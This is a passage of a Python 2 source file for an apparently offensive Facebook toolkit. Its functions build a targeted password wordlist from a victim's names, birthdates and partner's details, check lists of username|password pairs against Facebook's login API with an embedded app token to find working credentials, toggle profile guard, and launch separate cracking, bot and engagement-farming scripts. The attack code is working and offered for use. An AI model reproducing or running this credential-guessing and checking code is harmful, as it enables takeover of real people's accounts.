    print (('{}[{}01{}] {}Create Wordlist{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}02{}] {}Account Checker{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}03{}] {}Profile Guard{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}00{}] {}Go Back{}').format(yellow, blue, yellow, red, finished))
    print 48 * (('{}─{}').format(black, finished))
    pilih_others()
def pilih_others():
    array6 = raw_input(('{}║\n╚══{}➤ {}').format(black, red, finished))
    if array6 == '1' or array6 == '01':
        wordlist()
    elif array6 == '2' or array6 == '02':
        check_akun()
    elif array6 == '3' or array6 == '03':
        guard()
    elif array6 == '0' or array6 == '00':
        menu()
    else:
        run ('[!] Invalid input!')
        time.sleep(2)
        others()
def wordlist():
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    try:
        os.system('clear')
        banner_1()
        print (('{}[{}INFO{}] {}Fill in the complete target data below{}!{}').format(red, blue, red, white, red, finished))
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        a = raw_input(('{}[{}+{}] {}Name Front {}: {}').format(red, white, red, green, red, finished))
        file = open('/sdcard/HTTPNET/wordlist.txt', 'w')
        b = raw_input(('{}[{}+{}] {}Name Middle {}: {}').format(red, yellow, red, green, red, finished))
        c = raw_input(('{}[{}+{}] {}Name Back {}: {}').format(red, white, red, green, red, finished))
        d = raw_input(('{}[{}+{}] {}Name Call {}: {}').format(red, purple, red, green, red, finished))
        e = raw_input(('{}[{}+{}] {}Date of birth {}>{}mex{}: {}|XNXX| {}: {}').format(red, white, red, green, red, cyan, red, black, red, finished))
        f = e[0:2]
        g = e[2:4]
        h = e[4:]
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        print (('{}[{}?{}] {}If you are single{}, {}just skip {}:{}v{}').format(red, white, red, yellow, redlite, yellow, red, white, finished))
        i = raw_input(('{}[{}+{}] {}Name Girlfriend {}: {}').format(red, white, red, green, red, finished))
        j = raw_input(('{}[{}+{}] {}Name Girlfriend Call {}: {}').format(red, yellow, red, green, red, finished))
        k = raw_input(('{}[{}+{}] {}Date of birth gf {}>{}mex{}: {}|XNXX| {}: {}').format(red, white, red, green, red, cyan, red, black, red, finished))
        jalan(('{}[{}✺{}] {}Start creating{}...{}').format(red, green, red, green, black, finished))
        l = k[0:2]
        m = k[2:4]
        n = k[4:]
        file.write('%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s' % (a, c, a, b, b, a, b, c, c, a, c, b, a, a, b, b, c, c, a, d, b, d, c, d, d, d, d, a, d, b, d, c, a, e, a, f, a, g, a, h, b, e, b, f, b, g, b, h, c, e, c, f, c, g, c, h, d, e, d, f, d, g, d, h, e, a, f, a, g, a, h, a, e, b, f, b, g, b, h, b, e, c, f, c, g, c, h, c, e, d, f, d, g, d, h, d, d, d, a, f, g, a, g, h, f, g, f, h, f, f, g, f, g, h, g, g, h, f, h, g, h, h, h, g, f, a, g, h, b, f, g, b, g, h, c, f, g, c, g, h, d, f, g, d, g, h, a, i, a, j, a, k, i, e, i, j, i, k, b, i, b, j, b, k, c, i, c, j, c, k, e, k, j, a, j, b, j, c, j, d, j, j, k, a, k, b, k, c, k, d, k, k, i, l, i, m, i, n, j, l, j, m, j, n, j, k))
        wg = 0
        while wg < 100:
            wg = wg + 1
            file.write(a + str(wg) + '\n')
        en = 0
        while en < 100:
            en = en + 1
            file.write(i + str(en) + '\n')
        word = 0
        while word < 100:
            word = word + 1
            file.write(d + str(word) + '\n')
        gen = 0
        while gen < 100:
            gen = gen + 1
            file.write(j + str(gen) + '\n')
        file.close()
        time.sleep(1.5)
        file = open('/sdcard/HTTPNET/wordlist.txt', 'a')
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        print (('{}[{}+{}] {}File saved {}: {}Successful{}').format(red, purple, red, green, red, white, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        others()
    except IOError as e:
        print (('{}[!] Failed!{}').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        others()
        #Function_The_End
def check_akun():
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    os.system('clear')
    banner_1()
    print (('{}[{}?{}] {}Create in file {}: {}username|password{}').format(red, white, red, green, red, white, finished))
    print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
    live = []
    cek = []
    die = []
    try:
        file = raw_input(('{}[{}+{}] {}File {}: {}').format(red, yellow, red, green, red, finished))
        list = open(file, 'r').readlines()
    except IOError:
        print (('{}[!] Error not found!{}').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        others()
    pemisah = raw_input(('{}[{}+{}] {}Separator {}: {}').format(red, purple, red, green, red, finished))
    jalan(('{}[{}✺{}] {}Start checking{}...{}').format(red, green, red, green, black, finished))
    print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
    for meki in list:
        username, password = meki.strip().split(str(pemisah))
        url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + password + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
        data = requests.get(url)
        mpsh = json.loads(data.text)
        if 'access_token' in mpsh:
            live.append(password)
            print (('{}[ {}Live{} ] {}' + username + '|' + password + '{}').format(red, green, red, white, finished))
        elif 'www.facebook.com' in mpsh['error_msg']:
            cek.append(password)
            print (('{}[ {}Check{} ] {}' + username + '|' + password + '{}').format(red, yellow, red, white, finished))
        else:
            die.append(password)
            print (('{}[ {}Die{} ] {}' + username + '|' + password + '{}').format(red, white, red, white, finished))
    print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
    print (('{}[{}+{}] {}Total {}: {}Live={}' + str(len(live)) + ' {}Check={}' + str(len(cek)) + ' {}Die={}' + str(len(die)) + '{}').format(red, yellow, red, green, red, white, green, white, yellow, white, red, finished))
    raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
    others()
    #Function_The_End
def guard():
    global toket
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    os.system('clear')
    banner_1()
    print 48 * (('{}─{}').format(black, finished))
    print (('{}[{}01{}] {}Activate{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}02{}] {}Not Activate{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}00{}] {}Go Back{}').format(yellow, blue, yellow, red, finished))
    print 48 * (('{}─{}').format(black, finished))
    g = raw_input(('{}║\n╚══{}➤ {}').format(black, red, finished))
    if g == '1' or g == '01':
        aktif = 'true'
        gaz(toket, aktif)
    elif g == '2' or g == '02':
        non = 'false'
        gaz(toket, non)
    elif g == '0' or g == '00':
        others()
    elif g == '':
        run ('[!] Invalid input!')
        time.sleep(2)
    else:
        guard()
def get_userid(toket):
    url = 'https://graph.facebook.com/me?access_token=%s' % toket
    res = requests.get(url)
    uid = json.loads(res.text)
    return uid['id']
def gaz(toket, enable=True):
    id = get_userid(toket)
    data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth %s' % toket}
    url = 'https://graph.facebook.com/graphql'
    res = requests.post(url, data=data, headers=headers)
    print res.text
    if '"is_shielded":true' in res.text:
        os.system('reset')
        banner_1()
        print 48 * (('{}─{}').format(black, finished))
        print (('{}[{}✓{}] {}Activate{}').format(red, cyan, red, green, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        others()
    elif '"is_shielded":false' in res.text:
        os.system('reset')
        banner_1()
        print 48 * (('{}─{}').format(black, finished))
        print (('{}[{}✓{}] {}Not Activate{}').format(black, cyan, black, red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        others()
    else:
        print (('{}[!] Error!').format(red, finished))
        os.sys.exit()
        #Function_The_End
def fb_bot():
    os.system('clear')
    os.system('cd AGITFOLDER;php fb-bot.php')
    os.sys.exit()
        #Function_The_End
def cok_tkn():
    os.system('clear')
    banner_1()
    os.system('cd AGITFOLDER/fbcoktkn;python cok_tkn.py')
    raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
    main_menu()
        #Function_The_End
def Instagram():
    os.system('clear')
    os.system('cd AGITFOLDER/igprogram;python igprogram.py')
    raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
    main_menu()
        #Function_The_End
def fbwebtoolkit():
    clr()
    os.system('toilet -f smmono9 Select OptioN | lolcat')
    running(('  {}+{}———{}———{}———{}———{}[{} Secondary~Menu {}]{}———{}———{}———{}———-{}+{}').format(red, yellow, black, yellow, black, red, green, red, yellow, black, yellow, black, red, finished))
    running(('   {}| {}[{}1{}] {}Traodoisub.Com                      {}|\n      {}|{}').format(cyanlite, red, white, red, yellow, cyanlite, black, finished))
    running(('   {}| {}[{}2{}] {}Vipig.Net                           {}|\n      {}|{}').format(black, red, white, red, yellow, black, black, finished))
    running(('   {}| {}[{}3{}] {}Tuongtaccheo.Com                    {}|\n      {}|{}').format(cyanlite, red, white, red, yellow, cyanlite, black, finished))
    running(('   {}| {}[{}4{}] {}Tuongtaccheo.Com {}({}Old{})              {}|\n      {}|{}').format(black, red, white, red, yellow, redlite, yellowlite, redlite, black, black, finished))
    running(('   {}| {}[{}5{}] {}Script Coming Soon{}..                {}|\n      {}|{}').format(cyanlite, red, white, red, yellow, redlite, cyanlite, black, finished))
    running(('   {}| {}[{}0{}] {}Go Back Menu                        {}|{}').format(black, red, white, red, yellow, black, finished))
    running(('   {}×{}——{}——{}——{}———{}———{}———{}———{}———{}———{}———{}———{}———{}———{}———{}——{}×{}').format(red, black, yellow, black, yellow, black, yellow, black, yellow, black, yellow, black, yellow, black, yellow, black, red, finished))
    try:
        inp = raw_input(('\n{}[{}ッ{}]{} EnterChoose{}]{}> {}').format(red, white, red, yellow, black, red, finished))
    except (KeyboardInterrupt,EOFError):
        run ('Non-Active!!')
    if inp == '1' or inp == '01':
        os.system('cd AGITFOLDER/fbwebtoolkit;python traodoisub.py')
    elif inp == '2' or inp == '02':
        os.system('cd AGITFOLDER/fbwebtoolkit;python3 vipig.py')
    elif inp == '3' or inp == '03':
        os.system('cd AGITFOLDER/fbwebtoolkit;php tuongtaccheo.php')
    elif inp == '4' or inp == '04':
        os.system('cd AGITFOLDER/fbwebtoolkit;php tuongtaccheo_old.php')
    elif inp == '5' or inp == '05':
        fbwebtoolkit()
    elif inp == '0' or inp == '00':
        main_menu()
    else:
        running(('{}Wrong input!{}').format(red, finished))
        time.sleep(2)
        fbwebtoolkit()
        #Function_The_End
def fbcrack():
    os.system('cd AGITFOLDER/fbnologcrack;python2 fbnologcrack.py')
    exit()
        #Function_The_End
def updatetool():
        clr()
        os.system('toilet -f smmono9 Latest Update | lolcat')
        jalan('{}[{}+{}] {}>> {}DOWNLOAD LATEST UPDATE{} {}>>\n{}[{}INFO{}] {}After finished update this script then re-enter again this tool{}, {}use {}cd ~/iFbToolKit {}And run again \n{}python2 ifbtoolkit.py\n{}[{}✔{}] {}Please wait Script Updating{}...\n    {}This process is just few seconds{}'.format(red,green,red,blue,greenredmix,finished,blue,red,green,red,cyanlite,redlite,cyanlite,yellowlite,cyanlite,yellowlite,red,green,red,white,red,white,finished))
        time.sleep(10)
        os.system('rm -rf $HOME/iFbToolKit;cd $HOME;git clone https://github.com/MrGhostOfficial/iFbToolKit.git;cd ~/iFbToolKit;chmod +x ifbtoolkit.py;clear;cowsay -f ghostbusters.cow MrGHOST;echo;ls;echo')
        time.sleep(2)
        sys.exit()
        #Function_The_End
def telegram():
        clr()
        os.system('toilet -f mono9 -F border "Telegram" | lolcat')
        jalan('{}[{}INFO{}] {}Hello User{}, {}Welcome to My telegram Group if you need Any help about My Script Or You are Facing This Script try to any problem{}, {}Then contact On my telegram group i well try to help you and if You have also github account then dont forget to Follow/Stars Me on GitHub{}, {}Thanks for with us ENJOY{}.{}(🥀😎){}'.format(red,green,red,cyan,redlite,cyan,redlite,cyan,redlite,cyan,whitelite,redlite,finished))
        os.system('xdg-open https://t.me/MrGhostClassic')
        time.sleep(3)
        backmenu()
        #Function_The_End
def backmenu():
    running(('\n{}if you dont understand how to Use it then follow \nme telegram group or my youtube channel.{}').format(purplelite, finished))
    running(('  {}+----------{}[{}Secondary~Menu{}]{}----------------+{}').format(black, red, green, red, black, finished))
    running(('   {}| {}[{}1{}] {}Main-menu                          {}|{}').format(black, red, green, red, yellow, black, finished))
    running(('   {}| {}[{}e{}] {}Exit                               {}|{}').format(black, red, white, red, yellow, black, finished))
    running(('   {}+----------------------------------------+{}').format(black, finished))
    try:
        inp = raw_input(('{}[{}ッ{}]{} EnterChoose{}]{}> {}').format(red, white, red, yellow, black, red, finished))
    except (KeyboardInterrupt,EOFError):
        run ('Non-Active!!')
    if inp == '1' or inp == '01':
        main_menu()
    elif inp == 'e' or inp == 'E':
        exit()
    else:
        running(('{}Wrong input!{}').format(red, finished))
        time.sleep(2)
        backmenu()
        #Function_The_End
def exit():
    clr()
    os.system('toilet -f smmono9 -F gay MrGhost-Tool')
    running(('{}   +----------------------------------------+{}').format(black, finished))
    running(('{}   |    {}Thanks for using This Script Tool   {}|{}').format(black, green, black, finished))
    running(('{}   |       {}See you at next time             {}|{}').format(black, yellow, black, finished))
    running(('{}   |----------------------------------------|{}').format(black, finished))
    running(('{}   |          {}Bye Bye {}( {}^{}_{}^ {}){}/              {}|{}').format(black, cyan, white, red, cyan, red, white, whitelite, black, finished))
    running(('{}   +----------------------------------------+{}').format(black, finished))
    running(('{}       Friends keep supporting me and{}').format(purplelite, finished))
    running(('{}       Motivating me for making new tools{}').format(yellowlite, finished))
    running(('{}       FOR YOU ENJOY..🥀👾{}').format(greenlite, finished))
    run('       thanks for using my tools bye!')
    print "\n"
    time.sleep(1)
    sys.exit()
        #Function_The_End
if __name__ == '__main__':
    main_menu()